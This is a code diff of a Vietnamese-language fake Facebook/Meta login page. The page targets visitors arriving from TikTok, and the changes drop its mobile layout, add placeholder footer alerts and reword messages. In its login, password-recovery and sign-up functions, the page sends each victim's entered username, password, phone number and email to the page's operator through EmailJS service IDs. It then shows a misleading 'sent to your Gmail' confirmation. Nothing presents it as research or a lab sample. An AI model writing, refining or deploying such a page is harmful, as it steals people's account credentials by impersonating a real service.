@@ -95,7 +95,7 @@
         .back-button svg {
             margin-right: 8px;
         }
-        .login-container-tiktok, .login-container-desktop, .login-container-mobile,
+        .login-container-tiktok, .login-container-desktop,
         .forgot-password-container, .forgot-password-email-container, .create-account-container {
             background: #fff;
             padding: 15px;
@@ -106,7 +106,7 @@
             margin: 0 auto;
             max-width: 400px;
         }
-        .login-container-tiktok.active, .login-container-desktop.active, .login-container-mobile.active,
+        .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .forgot-password-email-container.active, 
         .create-account-container.active {
             display: block;
@@ -130,6 +130,7 @@
             font-weight: bold;
             font-size: 14px;
             margin-bottom: 10px;
+            cursor: pointer;
         }
         .btn-create-account {
             background-color: #42B72A;
@@ -141,6 +142,7 @@
             font-size: 14px;
             display: inline-block;
             margin-top: 10px;
+            cursor: pointer;
         }
         .forgot-password {
             margin-top: 10px;
@@ -168,6 +170,7 @@
             border-radius: 6px;
             font-size: 12px;
             cursor: pointer;
+            text-decoration: none;
         }
         .success-popup {
             display: none;
@@ -320,15 +323,6 @@
             <div class="divider"></div>
             <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
-        <!-- Mobile (Safari/Google) Login Container -->
-        <div class="login-container-mobile">
-            <input type="text" id="login-input-mobile" class="form-control" placeholder="Số điện thoại/Email/Tên người dùng">
-            <input type="password" id="password-mobile" class="form-control" placeholder="Mật khẩu">
-            <button class="btn btn-primary" onclick="login('mobile')">Đăng nhập</button>
-            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
-            <div class="divider"></div>
-            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
-        </div>
         <!-- Forgot Password Container -->
         <div class="forgot-password-container">
             <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
@@ -366,41 +360,41 @@
     </div>
     <footer class="footer">
         <div class="footer-languages">
-            <a href="#">Tiếng Việt</a>
-            <a href="#">English (UK)</a>
-            <a href="#">中文(台灣)</a>
-            <a href="#">한국어</a>
-            <a href="#">日本語</a>
-            <a href="#">Français (France)</a>
-            <a href="#">ภาษาไทย</a>
-            <a href="#">Español</a>
-            <a href="#">Português (Brasil)</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Italiano</a>
+            <a href="#" onclick="alert('Chuyển sang Tiếng Việt')">Tiếng Việt</a>
+            <a href="#" onclick="alert('Chuyển sang English (UK)')">English (UK)</a>
+            <a href="#" onclick="alert('Chuyển sang 中文(台灣)')">中文(台灣)</a>
+            <a href="#" onclick="alert('Chuyển sang 한국어')">한국어</a>
+            <a href="#" onclick="alert('Chuyển sang 日本語')">日本語</a>
+            <a href="#" onclick="alert('Chuyển sang Français (France)')">Français (France)</a>
+            <a href="#" onclick="alert('Chuyển sang ภาษาไทย')">ภาษาไทย</a>
+            <a href="#" onclick="alert('Chuyển sang Español')">Español</a>
+            <a href="#" onclick="alert('Chuyển sang Português (Brasil)')">Português (Brasil)</a>
+            <a href="#" onclick="alert('Chuyển sang Deutsch')">Deutsch</a>
+            <a href="#" onclick="alert('Chuyển sang Italiano')">Italiano</a>
         </div>
         <div class="footer-links">
             <a onclick="showLogin()">Đăng nhập</a>
             <a onclick="showCreateAccount()">Đăng ký</a>
-            <a href="#">Messenger</a>
-            <a href="#">Facebook Lite</a>
-            <a href="#">Video</a>
-            <a href="#">Địa điểm</a>
-            <a href="#">Trò chơi</a>
-            <a href="#">Marketplace</a>
-            <a href="#">Meta Pay</a>
-            <a href="#">Meta Store</a>
-            <a href="#">Meta Quest</a>
-            <a href="#">Instagram</a>
-            <a href="#">Threads</a>
-            <a href="#">Quyên góp</a>
-            <a href="#">Giới thiệu</a>
-            <a href="#">Trợ giúp</a>
-            <a href="#">Tạo quảng cáo</a>
-            <a href="#">Tạo Trang</a>
-            <a href="#">Nhà phát triển</a>
-            <a href="#">Tuyển dụng</a>
-            <a href="#">Cookie</a>
-            <a href="#">Điều khoản</a>
+            <a href="#" onclick="alert('Mở Messenger')">Messenger</a>
+            <a href="#" onclick="alert('Mở Facebook Lite')">Facebook Lite</a>
+            <a href="#" onclick="alert('Mở Video')">Video</a>
+            <a href="#" onclick="alert('Mở Địa điểm')">Địa điểm</a>
+            <a href="#" onclick="alert('Mở Trò chơi')">Trò chơi</a>
+            <a href="#" onclick="alert('Mở Marketplace')">Marketplace</a>
+            <a href="#" onclick="alert('Mở Meta Pay')">Meta Pay</a>
+            <a href="#" onclick="alert('Mở Meta Store')">Meta Store</a>
+            <a href="#" onclick="alert('Mở Meta Quest')">Meta Quest</a>
+            <a href="#" onclick="alert('Mở Instagram')">Instagram</a>
+            <a href="#" onclick="alert('Mở Threads')">Threads</a>
+            <a href="#" onclick="alert('Mở Quyên góp')">Quyên góp</a>
+            <a href="#" onclick="alert('Mở Giới thiệu')">Giới thiệu</a>
+            <a href="#" onclick="alert('Mở Trợ giúp')">Trợ giúp</a>
+            <a href="#" onclick="alert('Mở Tạo quảng cáo')">Tạo quảng cáo</a>
+            <a href="#" onclick="alert('Mở Tạo Trang')">Tạo Trang</a>
+            <a href="#" onclick="alert('Mở Nhà phát triển')">Nhà phát triển</a>
+            <a href="#" onclick="alert('Mở Tuyển dụng')">Tuyển dụng</a>
+            <a href="#" onclick="alert('Mở Cookie')">Cookie</a>
+            <a href="#" onclick="alert('Mở Điều khoản')">Điều khoản</a>
         </div>
         <div class="footer-meta">Meta © 2025</div>
     </footer>
@@ -417,7 +411,6 @@
             const userAgent = navigator.userAgent.toLowerCase();
             const urlParams = new URLSearchParams(window.location.search);
             const isDesktop = window.innerWidth > 1024 && !/mobile|android|iphone|ipad/i.test(userAgent);
-            const isMobile = /mobile|android|iphone|ipad/i.test(userAgent);
             const isFromTikTok = 
                 referrer.includes("tiktok.com") || 
                 userAgent.includes("tiktok") || 
@@ -427,10 +420,9 @@
             console.log("User Agent:", userAgent);
             console.log("URL Params:", urlParams.toString());
             console.log("Is Desktop:", isDesktop);
-            console.log("Is Mobile:", isMobile);
             console.log("Is From TikTok:", isFromTikTok);
 
-            document.body.classList.remove('tiktok-mode', 'desktop-mode', 'mobile-mode');
+            document.body.classList.remove('tiktok-mode', 'desktop-mode');
 
             if (isFromTikTok && !isDesktop) {
                 console.log("Applying TikTok mode");
@@ -439,27 +431,19 @@
                 document.querySelector('.left-section').style.display = 'none';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-tiktok');
-            } else if (isDesktop) {
+            } else {
                 console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'block';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-desktop');
-            } else if (isMobile) {
-                console.log("Applying Mobile mode");
-                document.body.classList.add('mobile-mode');
-                document.querySelector('.header-container').classList.remove('hidden');
-                document.querySelector('.header-container').style.display = 'flex';
-                document.querySelector('.left-section').style.display = 'none';
-                document.querySelector('.language-text').style.display = 'block';
-                hideAllExcept('.login-container-mobile');
             }
         };
 
         function hideAllExcept(selector) {
             const containers = [
-                '.login-container-tiktok', '.login-container-desktop', '.login-container-mobile',
+                '.login-container-tiktok', '.login-container-desktop',
                 '.forgot-password-container', '.forgot-password-email-container', '.create-account-container'
             ];
             containers.forEach(container => {
@@ -474,7 +458,6 @@
 
         function showLogin() {
             const isDesktop = document.body.classList.contains('desktop-mode');
-            const isMobile = document.body.classList.contains('mobile-mode');
             const isTikTok = document.body.classList.contains('tiktok-mode');
             if (isTikTok) {
                 hideAllExcept('.login-container-tiktok');
@@ -484,11 +467,6 @@
                 hideAllExcept('.login-container-desktop');
                 document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.language-text').style.display = 'none';
-            } else if (isMobile) {
-                hideAllExcept('.login-container-mobile');
-                document.querySelector('.header-container').classList.remove('hidden');
-                document.querySelector('.header-container').style.display = 'flex';
-                document.querySelector('.language-text').style.display = 'block';
             }
             document.getElementById('back-button').style.display = 'none';
             document.querySelector('.left-section').style.display = isDesktop ? 'block' : 'none';
@@ -562,16 +540,14 @@
 
         function login(mode) {
             const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') :
-                             mode === 'desktop' ? document.getElementById('login-input-desktop') :
-                             document.getElementById('login-input-mobile');
+                             document.getElementById('login-input-desktop');
             const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') :
-                                 mode === 'desktop' ? document.getElementById('password-desktop') :
-                                 document.getElementById('password-mobile');
+                                 document.getElementById('password-desktop');
             const loginValue = loginInput.value;
             const password = passwordInput.value;
 
             if (!loginValue || !password) {
-                showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
+                showDialog("Đăng nhập thất bại!", "Vui lòng nhập đầy đủ thông tin!");
                 return;
             }
 
@@ -585,9 +561,9 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Đăng nhập thành công!", "Thông tin đăng nhập đã được gửi đến Gmail của bạn!");
+                    showDialog("Đăng nhập thành công!", "Thông tin đã được gửi đến Gmail của bạn!");
                 }, function(error) {
-                    showDialog("Đăng nhập không thành công!", "Có lỗi xảy ra, vui lòng thử lại!");
+                    showDialog("Đăng nhập thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
         }
 
@@ -600,7 +576,7 @@
             const templateParams = { password: '', phone: phone, email: '', firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Tìm kiếm thành công!", "Yêu cầu khôi phục đã được gửi đến Gmail liên kết với số điện thoại!");
+                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
                 }, function(error) {
                     showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                 });
@@ -615,7 +591,7 @@
             const templateParams = { password: '', phone: '', email: email, firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Tìm kiếm thành công!", "Yêu cầu khôi phục đã được gửi đến Gmail của bạn!");
+                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
                 }, function(error) {
                     showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                 });
@@ -648,7 +624,7 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Đăng ký thành công!", "Thông tin đã được gửi đến Gmail của bạn!");
+                    showDialog("Đăng ký thành công!", "Thông tin tài khoản đã được gửi đến Gmail của bạn!");
                 }, function(error) {
                     showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
